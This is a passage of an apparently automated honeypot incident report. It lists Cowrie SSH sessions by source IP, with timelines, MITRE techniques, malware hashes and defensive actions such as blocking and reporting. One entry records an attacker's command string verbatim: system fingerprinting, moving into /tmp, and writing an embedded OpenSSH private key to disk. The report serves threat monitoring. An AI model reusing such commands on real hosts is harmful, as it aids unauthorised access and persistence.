| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:28:44` | `cowrie.session.connect` |
| `2026-08-24 08:28:44` | `cowrie.client.version` |
| `2026-08-24 08:28:44` | `cowrie.client.kex` |
| `2026-08-24 08:28:45` | `cowrie.login.success` |
| `2026-08-24 08:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.171.90[.]17` to AbuseIPDB if not already reported
- [ ] Block `182.171.90[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd1599ef998

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:29 |
| **Last Seen** | 2026-08-24 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:29:06` | `cowrie.session.connect` |
| `2026-08-24 08:29:06` | `cowrie.client.version` |
| `2026-08-24 08:29:07` | `cowrie.client.kex` |
| `2026-08-24 08:29:07` | `cowrie.login.success` |
| `2026-08-24 08:29:08` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:29:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:29:08` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9503870769

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:29 |
| **Last Seen** | 2026-08-24 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:29:11` | `cowrie.session.connect` |
| `2026-08-24 08:29:11` | `cowrie.client.version` |
| `2026-08-24 08:29:11` | `cowrie.client.kex` |
| `2026-08-24 08:29:12` | `cowrie.login.success` |
| `2026-08-24 08:29:12` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:29:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:29:12` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998f9e42097c

| Field | Detail |
|---|---|
| **Source IP** | `103.7.60[.]253` |
| **First Seen** | 2026-08-24 08:29 |
| **Last Seen** | 2026-08-24 08:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:29:53` | `cowrie.session.connect` |
| `2026-08-24 08:29:54` | `cowrie.client.version` |
| `2026-08-24 08:29:54` | `cowrie.client.kex` |
| `2026-08-24 08:29:55` | `cowrie.login.success` |
| `2026-08-24 08:29:56` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.60[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.7.60[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10ca8e308964

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-08-24 08:30 |
| **Last Seen** | 2026-08-24 08:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:30:01` | `cowrie.session.connect` |
| `2026-08-24 08:30:02` | `cowrie.client.version` |
| `2026-08-24 08:30:02` | `cowrie.client.kex` |
| `2026-08-24 08:30:04` | `cowrie.login.success` |
| `2026-08-24 08:30:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-825e463e9636

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]6` |
| **First Seen** | 2026-08-24 08:32 |
| **Last Seen** | 2026-08-24 08:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:32:39` | `cowrie.session.connect` |
| `2026-08-24 08:32:39` | `cowrie.client.version` |
| `2026-08-24 08:32:39` | `cowrie.client.kex` |
| `2026-08-24 08:32:43` | `cowrie.login.success` |
| `2026-08-24 08:32:43` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]6` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-974b1e0ab55d

| Field | Detail |
|---|---|
| **Source IP** | `43.245.85[.]2` |
| **First Seen** | 2026-08-24 08:32 |
| **Last Seen** | 2026-08-24 08:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:32:49` | `cowrie.session.connect` |
| `2026-08-24 08:32:50` | `cowrie.client.version` |
| `2026-08-24 08:32:50` | `cowrie.client.kex` |
| `2026-08-24 08:32:52` | `cowrie.login.success` |
| `2026-08-24 08:32:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.85[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.85[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f247845f69ab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:38 |
| **Last Seen** | 2026-08-24 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:38:50` | `cowrie.session.connect` |
| `2026-08-24 08:38:50` | `cowrie.client.version` |
| `2026-08-24 08:38:50` | `cowrie.client.kex` |
| `2026-08-24 08:38:51` | `cowrie.login.success` |
| `2026-08-24 08:38:51` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:38:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:38:51` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67932186ae89

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:38 |
| **Last Seen** | 2026-08-24 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:38:54` | `cowrie.session.connect` |
| `2026-08-24 08:38:54` | `cowrie.client.version` |
| `2026-08-24 08:38:54` | `cowrie.client.kex` |
| `2026-08-24 08:38:55` | `cowrie.login.success` |
| `2026-08-24 08:38:55` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:38:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:38:56` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821860f551b3

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-08-24 08:42 |
| **Last Seen** | 2026-08-24 08:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:42:44` | `cowrie.session.connect` |
| `2026-08-24 08:42:45` | `cowrie.client.version` |
| `2026-08-24 08:42:45` | `cowrie.client.kex` |
| `2026-08-24 08:42:47` | `cowrie.login.success` |
| `2026-08-24 08:42:47` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8640f5e2aac3

| Field | Detail |
|---|---|
| **Source IP** | `219.143.40[.]210` |
| **First Seen** | 2026-08-24 08:42 |
| **Last Seen** | 2026-08-24 08:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:42:52` | `cowrie.session.connect` |
| `2026-08-24 08:42:53` | `cowrie.client.version` |
| `2026-08-24 08:42:53` | `cowrie.client.kex` |
| `2026-08-24 08:42:56` | `cowrie.login.success` |
| `2026-08-24 08:42:57` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.143.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `219.143.40[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2038efce4bef

| Field | Detail |
|---|---|
| **Source IP** | `85.229.6[.]228` |
| **First Seen** | 2026-08-24 08:42 |
| **Last Seen** | 2026-08-24 08:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:42:57` | `cowrie.session.connect` |
| `2026-08-24 08:42:57` | `cowrie.client.version` |
| `2026-08-24 08:42:57` | `cowrie.client.kex` |
| `2026-08-24 08:42:58` | `cowrie.login.success` |
| `2026-08-24 08:42:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.229.6[.]228` to AbuseIPDB if not already reported
- [ ] Block `85.229.6[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c158537977

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-08-24 08:43 |
| **Last Seen** | 2026-08-24 08:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:43:03` | `cowrie.session.connect` |
| `2026-08-24 08:43:04` | `cowrie.client.version` |
| `2026-08-24 08:43:04` | `cowrie.client.kex` |
| `2026-08-24 08:43:06` | `cowrie.login.success` |
| `2026-08-24 08:43:07` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d4b1fbb70d4

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]50` |
| **First Seen** | 2026-08-24 08:46 |
| **Last Seen** | 2026-08-24 08:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:46:50` | `cowrie.session.connect` |
| `2026-08-24 08:46:50` | `cowrie.client.version` |
| `2026-08-24 08:46:50` | `cowrie.client.kex` |
| `2026-08-24 08:46:51` | `cowrie.login.success` |
| `2026-08-24 08:46:51` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]50` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae2d4d43658

| Field | Detail |
|---|---|
| **Source IP** | `211.22.222[.]251` |
| **First Seen** | 2026-08-24 08:46 |
| **Last Seen** | 2026-08-24 08:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:46:57` | `cowrie.session.connect` |
| `2026-08-24 08:46:58` | `cowrie.client.version` |
| `2026-08-24 08:46:58` | `cowrie.client.kex` |
| `2026-08-24 08:47:01` | `cowrie.login.success` |
| `2026-08-24 08:47:02` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.222[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.22.222[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1cf7998028

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 08:47 |
| **Last Seen** | 2026-08-24 08:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:47:42` | `cowrie.session.connect` |
| `2026-08-24 08:47:42` | `cowrie.client.version` |
| `2026-08-24 08:47:42` | `cowrie.client.kex` |
| `2026-08-24 08:47:43` | `cowrie.login.success` |
| `2026-08-24 08:47:43` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:47:43` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f941c66389f

| Field | Detail |
|---|---|
| **Source IP** | `47.254.80[.]91` |
| **First Seen** | 2026-08-24 08:47 |
| **Last Seen** | 2026-08-24 08:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:47:49` | `cowrie.session.connect` |
| `2026-08-24 08:47:49` | `cowrie.client.version` |
| `2026-08-24 08:47:50` | `cowrie.client.kex` |
| `2026-08-24 08:47:50` | `cowrie.login.success` |
| `2026-08-24 08:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.80[.]91` to AbuseIPDB if not already reported
- [ ] Block `47.254.80[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a05044f529

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-24 08:47 |
| **Last Seen** | 2026-08-24 08:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:47:50` | `cowrie.session.connect` |
| `2026-08-24 08:47:50` | `cowrie.client.version` |
| `2026-08-24 08:47:51` | `cowrie.client.kex` |
| `2026-08-24 08:47:51` | `cowrie.login.success` |
| `2026-08-24 08:47:52` | `cowrie.session.params` |
| `2026-08-24 08:47:52` | `cowrie.command.input` |
| `2026-08-24 08:47:53` | `cowrie.session.file_download` |
| `2026-08-24 08:47:53` | `cowrie.session.file_download` |
| `2026-08-24 08:47:53` | `cowrie.log.closed` |
| `2026-08-24 08:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24df3765dd73

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:48 |
| **Last Seen** | 2026-08-24 08:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:48:37` | `cowrie.session.connect` |
| `2026-08-24 08:48:37` | `cowrie.client.version` |
| `2026-08-24 08:48:37` | `cowrie.client.kex` |
| `2026-08-24 08:48:39` | `cowrie.login.success` |
| `2026-08-24 08:48:39` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:48:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:48:39` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-670f1004e960

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:48 |
| **Last Seen** | 2026-08-24 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:48:41` | `cowrie.session.connect` |
| `2026-08-24 08:48:41` | `cowrie.client.version` |
| `2026-08-24 08:48:41` | `cowrie.client.kex` |
| `2026-08-24 08:48:42` | `cowrie.login.success` |
| `2026-08-24 08:48:43` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:48:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:48:43` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.209.229[.]23` | **35** | 2026-08-24 06:55 | 2026-08-24 08:51 | 35m | 0 | `T1592` | 🟠 MEDIUM |
| `101.201.104[.]216` | **5** | 2026-08-24 06:59 | 2026-08-24 07:20 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-24 07:08 | 2026-08-24 08:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.90[.]166` | **3** | 2026-08-24 06:56 | 2026-08-24 07:05 | 6m | 0 | `T1592` | 🟢 LOW |
| `36.255.97[.]14` | **3** | 2026-08-24 08:54 | 2026-08-24 08:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]132` | **2** | 2026-08-24 08:16 | 2026-08-24 08:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.159.166[.]182` | 1 | 2026-08-24 07:42 | 2026-08-24 07:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `106.12.127[.]250` | 1 | 2026-08-24 07:55 | 2026-08-24 07:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.88.72[.]214` | 1 | 2026-08-24 07:53 | 2026-08-24 07:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.111[.]71` | 1 | 2026-08-24 08:02 | 2026-08-24 08:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.187.228[.]233` | 1 | 2026-08-24 08:37 | 2026-08-24 08:38 | 61s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-08-24 08:37 | 2026-08-24 08:37 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-08-24 08:49 | 2026-08-24 08:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.89.248[.]224` | 1 | 2026-08-24 08:10 | 2026-08-24 08:10 | 11s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-08-24 08:04 | 2026-08-24 08:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.184.158[.]56` | 1 | 2026-08-24 08:05 | 2026-08-24 08:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `212.73.75[.]82` | 1 | 2026-08-24 08:05 | 2026-08-24 08:07 | 70s | 0 | `T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-08-24 07:27 | 2026-08-24 07:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.255.205[.]216` | 1 | 2026-08-24 07:05 | 2026-08-24 07:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.105.64[.]243` | 1 | 2026-08-24 07:16 | 2026-08-24 07:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-24 08:35 | 2026-08-24 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]219` | 1 | 2026-08-24 07:05 | 2026-08-24 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-08-24 08:35 | 2026-08-24 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.126.144[.]30` | 1 | 2026-08-24 07:37 | 2026-08-24 07:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `79.121.102[.]227` | 1 | 2026-08-24 07:36 | 2026-08-24 07:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-08-24 08:37 | 2026-08-24 08:39 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
